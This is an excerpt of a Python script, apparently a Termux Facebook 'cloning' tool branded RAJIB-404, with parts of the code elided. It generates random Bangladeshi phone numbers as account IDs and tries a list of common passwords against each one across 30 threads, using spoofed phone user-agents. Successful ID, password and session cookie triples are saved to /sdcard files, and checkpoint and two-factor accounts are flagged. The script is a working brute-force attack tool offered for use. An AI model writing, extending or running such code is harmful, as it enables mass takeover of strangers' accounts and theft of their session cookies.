...
oppo = random.choice(['RMX3151','REALME 8i','CPH1819','CPH2083','CPH1943','CPH2477'])
...
xa = random.choice(['MI CC9 Pro Premium Edition','Redmi Note 8 Pro','RADMI Y2','MI 8 Explorer Edition','Mi Note 10 Lite'])
...
def RAJIB1():
        ...
        return ua
#-----------------------------------------------------#
sys.stdout.write('\x1b]2; =[🌺]=[RAJIB-404]=[🌺]=\x07')
#-----------------------------------------------------#
vers = requests.get('https://raw.githubusercontent.com/RAJIB-404/RAJIB-404/main/version.txt').text
version = str(vers)
#-------------------------------#
...
{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    : RAJIB-SORKAR-😈        
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK  : RAJIB-SORKAR-😈        
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB    : RAJIB-SORKAR-😈          {version}{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
	os.system('clear')
...
try:
    os.system('clear')
    xnx = requests.get('https://raw.githubusercontent.com/RAJIB-404/MRBD/main/ON-OFF.txt').text
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/alamin195575/Aprovel/blob/main/Aprovel.txt').text    
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801782182477?text='+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FILE NAME : /sdcard/RAJIB.txt  etc..')
				linex()
				...
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/MR.RAJIB.2003');menu()
			elif xd in ['4','04']:os.system('xdg-open https://www.facebook.com/MR.RAJIB.2003');menu()
			elif xd in ['5','05']:os.system('xdg-open https://www.facebook.com/MR.RAJIB.2003');menu()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bRAJIB}[{G}RAJIB-M2{bRAJIB}]-[{G}%s{bRAJIB}]-[{G}OK:%s{bRAJIB}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bRAJIB}[{G}RAJIB-OK{bRAJIB}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/RAJIB-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[RAJIB-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[RAJIB-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bRAJIB}[{G}RAJIB-M1{bRAJIB}]-[{G}%s{bRAJIB}]-[{G}OK:%s{bRAJIB}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def RANDOMBD():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with tred(max_workers=30) as RAJIB:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ...
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','RAJIB','gaming','tamanna','jannat','laboni','708090','121234','77889900','999888','113355','112255','102030','405060','112200','506070','113355']
            ids = code+love
            if mthdx in ['1','1']:
            	RAJIB.submit(FIRE,ids,pwx,tl)
            if mthdx in ['2','2']:
            	RAJIB.submit(FIREX,ids,pwx,tl)
            if mthdx in ['3','3']:
            	RAJIB.submit(M3Z,ids,pwx,tl)
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAJIB-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAJIB}[{G}RAJIB-OK{bRAJIB}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bRAJIB}[{G}•{bRAJIB}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAJIB-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAJIB-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAJIB}[{G}•{bRAJIB}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAJIB-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAJIB-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAJIB}[{G}•{bRAJIB}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAJIB-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
